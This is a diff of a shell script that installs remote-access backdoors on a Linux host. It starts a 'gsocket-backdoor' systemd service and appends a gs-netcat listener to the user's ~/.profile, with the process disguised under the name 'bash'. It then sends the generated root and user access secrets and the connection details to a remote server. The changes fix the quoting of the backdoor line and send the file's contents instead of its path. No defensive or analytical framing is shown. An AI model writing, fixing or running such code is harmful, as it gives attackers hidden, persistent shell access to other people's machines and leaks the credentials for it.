@@ -384,7 +384,7 @@ EOF
     log_cmd "sudo systemctl start gsocket-backdoor.service" "Starting gsocket service" "$log_file"
     
     # Also put a gs-netcat backdoor in user's .profile
-    log_cmd "echo \"killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS=\"-s \"$gs_user_secret\" -liqD\" SHELL=/bin/bash exec -a -bash gs-netcat)\" >> ~/.profile" "Add backdoor to .profile" "$log_file"
+    log_cmd "echo 'killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS=\"-s $gs_user_secret -liqD\" SHELL=/bin/bash exec -a bash gs-netcat)' >> ~/.profile" "Add backdoor to .profile" "$log_file"
     log_cmd "source ~/.profile" "Reloading .profile" "$log_file"
     
     # Create connection instructions
@@ -402,7 +402,7 @@ EOF
     # Send the gsocket secret to the server
     send_logs "$log_file" "$gs_root_secret" "gsocket_root_secret"
     send_logs "$log_file" "$gs_user_secret" "gsocket_user_secret"
-    send_logs "$log_file" "$TEMP_DIR/gsocket_info.txt" "gsocket_info"
+    send_logs "$log_file" "$(cat $TEMP_DIR/gsocket_info.txt)" "gsocket_info"
     
     echo "[+] GSocket installed. You can connect using: gs-netcat -s $gs_root_secret"
 }
